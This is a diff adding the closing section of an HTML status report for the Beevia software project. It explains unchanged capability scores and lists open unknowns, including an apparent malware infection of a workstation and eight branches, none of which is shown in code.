+        <p><strong>Capability 3 did not move</strong> despite this edition's largest new piece of information, because knowing the right architecture is not the same as having built it. The correction in &sect;2.1 changes what the remaining 0.85 of that capability <em>costs</em>; it does not change how much of it exists.</p>
+        <p style="margin-bottom:0"><strong>Capability 11 did not move for Module 4 either</strong>, even though a complete implementation was found today. It is on an unmerged branch, and the rubric's rule is explicit: unmerged branches do not score. If <code>feat/admin-chats</code> merges, this line moves again and the report will name that as the reason.</p>
+      </div>
+
+      <h3>What this report cannot tell you</h3>
+      <div class="note">
+        <p><strong>Whether the infected workstation has been cleaned, or whether credentials were rotated.</strong> Both are invisible from a git clone (&sect;1.4).</p>
+        <p><strong>Whether branch protection is enabled.</strong> The available GitHub token cannot see the org at all, so &ldquo;404&rdquo; means nothing either way.</p>
+        <p><strong>Whether the payload ever executed, on which machines, or what it exfiltrated.</strong> No second stage was retrieved and no C2 address was resolved.</p>
+        <p><strong>Whether the eight infected branches are still wanted.</strong> Content analysis says seven carry nothing unique; whether someone is mid-task on one is a question for them.</p>
+        <p><strong>Whether metadata-only moderation is the accepted answer to Module 4.</strong> It is built that way (&sect;4.4); nothing records the decision.</p>
+        <p><strong>Whether the server-side <code>/translate</code> surface is being retired.</strong> Same shape: the sprint implies it, nothing states it.</p>
+        <p><strong>Whether the new wallets endpoint works.</strong> It ships with unit tests, which is new and good, but there are no HTTP-level tests and no second reviewer; testing is out of scope for scoring per the owner's 2026-08-07 instruction.</p>
+        <p><strong>Whether the dashboard's transaction filters actually filter.</strong> The client sends them; nobody has confirmed the endpoint reads them.</p>
+        <p><strong>What the 67 days of dropped Anchor events cost.</strong> Still unmeasured, seven days after the fix.</p>
+        <p><strong>Why <code>BVA-I192</code> has not merged</strong>, now fourteen commits deep with its board item closed.</p>
+        <p><strong>Anything about the Admin Dashboard board</strong> beyond its existence &mdash; nineteenth edition with no sprint.</p>
+        <p style="margin-bottom:0"><strong>Velocity for either sprint</strong> &mdash; 0 of 64 and 0 of 25 items estimated, and nothing has reached REVIEW/QA in eleven days.</p>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<footer class="foot">
+  <span class="barcode barcode--lg" aria-hidden="true"></span>
+  <span>Beevia project status &middot; 2026-09-08 &middot; Sprint 0901 open, day 6 &middot; main clean, 8 branches not</span>
+  <span><a href="index.html">All frames</a></span>
+</footer>
+
+<script src="ui.js"></script>
+</body>
+</html>
